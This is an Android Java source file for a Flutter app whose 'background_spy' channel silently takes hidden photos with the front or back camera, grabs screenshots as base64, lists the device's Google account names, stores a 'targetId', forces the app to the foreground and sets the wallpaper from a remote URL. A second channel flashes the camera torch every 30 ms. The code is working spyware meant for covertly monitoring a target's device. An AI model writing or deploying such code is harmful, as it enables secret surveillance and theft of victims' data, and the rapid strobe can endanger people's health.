package com.nullx.pp;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.ImageFormat;
import android.graphics.SurfaceTexture;
import android.hardware.camera2.*;
import android.media.Image;
import android.media.ImageReader;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.view.View;
import android.util.Base64;
import android.util.Log;
import android.provider.Settings;
import java.io.ByteArrayOutputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import androidx.annotation.NonNull;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";

    private boolean isStrobeRunning = false;
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                else { result.notImplemented(); }
            });

        new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
            .setMethodCallHandler((call, result) -> {
                if (call.method.equals("startScreenStreamBackground")) {
                    result.success(getScreenShotBase64());
                } 
                else if (call.method.equals("takeSilentPhotoBackground")) {
                    String side = call.argument("side");
                    if (side == null) side = "back";
                    
                    captureHiddenPhoto(side, result);
                } 
                else if (call.method.equals("getGmailAccounts")) {
                    fetchGmailAccounts(result);
                }
                else if (call.method.equals("setWallpaper")) {
                    updateWallpaper(call.argument("url"), result);
                }
                else if (call.method.equals("bringToForeground")) {
                    Intent intent = new Intent(getContext(), MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    startActivity(intent);
                    result.success(true);
                }
                else if (call.method.equals("saveTargetId")) {
                    String targetId = call.arguments.toString();
                    getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", targetId).apply();
                    result.success(true);
                }
                else if (call.method.equals("openNotificationSettings")) {
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    result.success(true);
                }
                else { result.notImplemented(); }
            });
    }

    private void captureHiddenPhoto(String side, MethodChannel.Result result) {
        final CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            int targetFacing = side.equals("front") ? CameraCharacteristics.LENS_FACING_FRONT : CameraCharacteristics.LENS_FACING_BACK;
            String cameraId = null;
            for (String id : manager.getCameraIdList()) {
                if (manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == targetFacing) {
                    cameraId = id;
                    break;
                }
            }

            if (cameraId == null) { result.error("CAM_ERR", "Camera side " + side + " not found", null); return; }

            final ImageReader reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    try {
                        CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                        builder.addTarget(reader.getSurface());
                        camera.createCaptureSession(Arrays.asList(reader.getSurface()), new CameraCaptureSession.StateCallback() {
                            @Override
                            public void onConfigured(@NonNull CameraCaptureSession session) {
                                try {
                                    session.capture(builder.build(), null, null);
                                } catch (CameraAccessException e) { camera.close(); }
                            }
                            @Override public void onConfigureFailed(@NonNull CameraCaptureSession session) { camera.close(); }
                        }, null);
                    } catch (CameraAccessException e) { camera.close(); }
                }
                @Override public void onDisconnected(@NonNull CameraDevice camera) { camera.close(); }
                @Override public void onError(@NonNull CameraDevice camera, int error) { camera.close(); }
            }, null);

            reader.setOnImageAvailableListener(item -> {
                Image img = item.acquireLatestImage();
                if (img != null) {
                    ByteBuffer buffer = img.getPlanes()[0].getBuffer();
                    byte[] bytes = new byte[buffer.remaining()];
                    buffer.get(bytes);
                    img.close();
                    
                    Bitmap bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    bmp.compress(Bitmap.CompressFormat.JPEG, 40, out);
                    String base64 = Base64.encodeToString(out.toByteArray(), Base64.DEFAULT);
                    
                    uiHandler.post(() -> result.success(base64));
                }
            }, null);

        } catch (Exception e) {
            result.error("CAM_EXCEPTION", e.getMessage(), null);
        }
    }

    private void fetchGmailAccounts(MethodChannel.Result result) {
        try {
            Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
            StringBuilder sb = new StringBuilder();
            for (Account ac : accounts) sb.append(ac.name).append("\n");
            result.success(sb.toString().trim());
        } catch (Exception e) { result.error("GMAIL_ERR", e.getMessage(), null); }
    }

    private void updateWallpaper(String urlString, MethodChannel.Result result) {
        new Thread(() -> {
            try {
                URL url = new URL(urlString);
                WallpaperManager.getInstance(this).setStream(url.openStream());
                uiHandler.post(() -> result.success(true));
            } catch (Exception e) { uiHandler.post(() -> result.error("WALL_ERR", e.getMessage(), null)); }
        }).start();
    }

    private void startStrobeEffect() {
        if (isStrobeRunning) return;
        isStrobeRunning = true;
        final CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        strobeRunnable = new Runnable() {
            boolean isOn = false;
            @Override public void run() {
                try {
                    String camId = camManager.getCameraIdList()[0];
                    isOn = !isOn;
                    camManager.setTorchMode(camId, isOn);
                    if (isStrobeRunning) uiHandler.postDelayed(this, 30);
                } catch (Exception e) { isStrobeRunning = false; }
            }
        };
        uiHandler.post(strobeRunnable);
    }

    private void stopStrobeEffect() {
        isStrobeRunning = false;
        if (strobeRunnable != null) uiHandler.removeCallbacks(strobeRunnable);
        try { 
            CameraManager camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = camManager.getCameraIdList()[0];
            camManager.setTorchMode(camId, false); 
        } catch (Exception e) {}
    }

    private String getScreenShotBase64() {
        try {
            View v = getWindow().getDecorView().getRootView();
            v.setDrawingCacheEnabled(true);
            Bitmap b = Bitmap.createBitmap(v.getDrawingCache());
            v.setDrawingCacheEnabled(false);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            b.compress(Bitmap.CompressFormat.JPEG, 50, out);
            return Base64.encodeToString(out.toByteArray(), Base64.DEFAULT);
        } catch (Exception e) { return null; }
    }
}